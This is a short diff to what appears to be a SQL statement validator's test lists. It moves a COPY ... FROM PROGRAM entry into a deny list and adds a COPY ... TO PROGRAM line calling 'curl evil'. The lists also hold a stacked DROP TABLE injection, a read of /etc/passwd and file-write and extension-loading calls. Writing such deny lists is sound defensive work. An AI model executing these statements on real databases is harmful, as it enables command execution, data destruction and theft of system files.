@@ -53,7 +53,6 @@ DDL = [
     "VACUUM",
     "REINDEX",
     "SELECT 1; DROP TABLE t",
-    "COPY t FROM PROGRAM 'id'",
     "COPY t FROM '/etc/passwd'",
     "GRANT SELECT ON t TO u",
     "CREATE TABLE t AS SELECT ';' ",
@@ -64,6 +63,8 @@ DENY = [
     "SELECT writefile('/tmp/x', 'y')",
     "PRAGMA writable_schema=ON",
     "select LOAD_EXTENSION('x')",
+    "COPY t FROM PROGRAM 'id'",
+    "COPY (SELECT 1) TO PROGRAM 'curl evil'",
 ]
 
 
